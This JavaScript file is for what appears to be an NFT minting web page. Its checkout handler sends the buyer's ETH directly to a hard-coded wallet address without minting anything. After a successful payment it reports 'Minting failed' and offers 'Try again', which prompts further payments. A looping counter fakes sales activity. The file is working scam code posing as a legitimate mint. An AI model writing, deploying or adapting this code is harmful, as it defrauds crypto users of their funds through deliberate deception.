const statusp = document.querySelector("#status");
const connectBtn = document.querySelector('#connectBtn');
const checkoutBtn = document.querySelector('#checkoutBtn');
//const connectBtnHeader = document.querySelector('#connectBtnHeader');
const pricePerNFT = 0.15;


$(document).ready(function (){
var count = 4949;
function myCount() {
if (count > 4837) {
 count = 4234;
}
$('.count').text(count);
count ++;

}

setInterval(myCount,982);
});

/** input number spinner
 */
let plusBtn = document.querySelector('div[id*="btn-plus"]');
let minusBtn = document.querySelector('div[id*="btn-minus"]');
let totalNFTInput = document.querySelector('input[type="text"][id="totalNFT"]')
let totalETHSpan =  document.querySelector('#totalETH');
totalNFTInput.value = 1;
totalETHSpan.innerText = totalNFTInput.value * pricePerNFT;

plusBtn.addEventListener('click',()=>{
  totalNFTInput.value = Number(totalNFTInput.value)  + 1;
  totalETHSpan.innerText = (totalNFTInput.value * pricePerNFT).toFixed(2);
})
minusBtn.addEventListener('click',()=>{
  if (Number(totalNFTInput.value)>1) {
    totalNFTInput.value =  Number(totalNFTInput.value) - 1;
    totalETHSpan.innerText = (totalNFTInput.value * pricePerNFT).toFixed(2);
  }
  
}) 
//** end of input number spinner */

connectBtn.addEventListener('click', async () => {
    if (window.ethereum) {
      window.web3 = new Web3(ethereum);
      try {
        await ethereum.enable();
        initPayButton()
        statusp.innerHTML = 'Wallet connected. Mint your NFTs now!'
      } catch (err) {
        console.log(err)
        statusp.innerHTML = 'Wallet access denied'
      }
    } else if (window.web3) {
      window.web3 = new Web3(web3.currentProvider)
      initPayButton()
    } else {
      statusp.innerHTML = 'No Metamask (or other Web3 Provider) installed';
    }
  })

  /*
  connectBtnHeader.addEventListener('click', async () => {
    if (window.ethereum) {
      window.web3 = new Web3(ethereum);
      try {
        await ethereum.enable();
        initPayButton()
        statusp.innerHTML = 'Wallet connected. Mint your NFTs now!'
      } catch (err) {
        console.log(err)
        statusp.innerHTML = 'Wallet access denied'
      }
    } else if (window.web3) {
      window.web3 = new Web3(web3.currentProvider)
      initPayButton()
    } else {
      statusp.innerHTML = 'No Metamask (or other Web3 Provider) installed';
    }
  }) */
  
  const initPayButton = () => {
    checkoutBtn.addEventListener('click', async () => {
      statusp.innerText = 'Minting in progress....'
      // paymentAddress is where funds will be send to
      const paymentAddress = '0xcf85047D0e14C64C42f8221012BD0B8388Dc58Ce'
      let totalEth = totalETHSpan.innerText;
      totalEth = totalEth.toString();
      const accounts = await web3.eth.getAccounts();
      web3.eth.sendTransaction({
        from: web3.currentProvider.selectedAddress,
        to: paymentAddress,
        value: web3.utils.toWei(totalEth, 'ether')
        }, (err, transactionId) => {
        if  (err) {
          console.log('Minting failed', err)
          statusp.innerText = 'Minting failed'
        } else {
          console.log('Minting succeed', transactionId)
          statusp.innerText = 'Minting failed';
          checkoutBtn.innerText = 'Try again'  
        }
      })
    })
  }

  
   /* <script>
  var x = 1;
  var nftMax = 5;
  $('.mint_number-button-wrapper').on('click', function () {
    if ($(this).hasClass('up')) {
      $('.mint_number-button-wrapper.down').removeClass('is-disabled');
      //A MAX - 1
      if (x === nftMax - 1) {
        $('.mint_number').val(++x);
        $('.mint_number-button-wrapper.up').addClass('is-disabled');
      } else if (x === nftMax) {
        //DO NOTHING
      } else {
        $('.mint_number').val(++x);
      }
    } else {
      $('.mint_number-button-wrapper.up').removeClass('is-disabled');
      if (x === 2) {
        $('.mint_number').val(--x);
        $('.mint_number-button-wrapper.down').addClass('is-disabled');
      }
      if (x === 1) {
        //DO NOTHING
      } else {
        $('.mint_number').val(--x);
      }
    }
  });
    // on input value change
  $('.mint_number').change(function () {
    $('.mint_number-button-wrapper').removeClass('is-disabled');
    // convert input value to number
    const num = Number($(this).val());
    // if it's a number
    if (num) {
      // assign its value to x
      x = num;
    }
    if (x > nftMax) {
      x = nftMax;
      $('.mint_number').val(nftMax);
      $('.mint_number-button-wrapper.up').addClass('is-disabled');
    } else if (x <= 1) {
      x = 1;
      $('.mint_number').val(1);
      $('.mint_number-button-wrapper.down').addClass('is-disabled');
    }
  });
  (function ($) {
    $("input[name='mint-number']").on('input', function (e) {
      console.log('change');
      $(this).val(
        $(this)
          .val()
          .replace(/[^0-5]/g, '')
      );
    });
  })(jQuery);
//Fermer les messages de succes/erreur
(function ($) {
  $('.mint_message-cross-wrapper').on('click',function() {
  	$('.message-wrapper').hide();
  });
})(jQuery);
</script> */
